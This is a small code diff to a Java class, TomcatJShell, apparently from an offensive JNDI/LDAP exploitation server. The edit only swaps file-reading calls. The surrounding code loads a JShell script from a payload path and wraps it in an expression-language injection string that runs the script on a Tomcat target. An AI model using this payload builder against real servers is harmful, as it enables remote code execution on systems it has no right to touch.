@@ -10,8 +10,9 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
-import java.nio.file.Path;
+import java.nio.file.Paths;
 
 import static artsploit.Utilities.serialize;
 
@@ -46,7 +47,7 @@ public class TomcatJShell implements LdapController {
         } else {
             System.out.println("Using payload from " + Config.jshellPayloadPath);
 
-            String jshellScript = Files.readString(Path.of(Config.jshellPayloadPath))
+            String jshellScript = new String(Files.readAllBytes(Paths.get(Config.jshellPayloadPath)), StandardCharsets.UTF_8)
                     .replace("\"", "\\\"");
 
             payload = "{\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"${script}\")}"
